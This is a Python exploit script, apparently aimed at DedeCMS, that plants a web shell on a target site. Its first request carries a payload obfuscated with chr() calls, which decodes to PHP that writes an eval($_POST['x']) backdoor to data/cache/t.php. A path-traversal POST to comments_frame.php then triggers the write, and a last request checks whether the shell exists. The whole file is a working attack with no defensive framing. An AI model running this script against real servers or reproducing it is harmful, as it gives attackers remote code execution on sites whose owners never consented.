import requests
from termcolor import cprint


class final_getshell:

    def __init__(self,url):
        self.url = url

    def checktrace(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "plus/digg_ajax.php?id=1024e1024&*/fputs(fopen(chr(46).chr(46).chr(47).chr(100).chr"\
                    "(97).chr(116).chr(97).chr(47).chr(99).chr(97).chr(99).chr(104).chr(101).chr(47).chr"\
                    "(116).chr(46).chr(112).chr(104).chr(112),chr(119).chr(43)),chr(60).chr(63).chr(112)"\
                    ".chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(9"\
                    "5).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(120).chr(39).chr(93).chr(41)"\
                    ".chr(59).chr(63).chr(62));/*"
        payload2 = "needCode=aa/../../../data/mysql_error_trace"
        payload3 = "data/cache/t.php"
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        vulnurl = url + payload

        try:
            r = requests.get(url=vulnurl,headers=headers)
            if r.status_code == 200 :
                m = requests.post(url=url+'plus/comments_frame.php',data=payload2,headers=headers)
                if m.status_code == 200:
                    s = requests.get(url=url+payload3,headers=headers)
                    if s.status_code == 200:
                        cprint("target may be getshell:" + url + payload3, "red")

        except:
            return False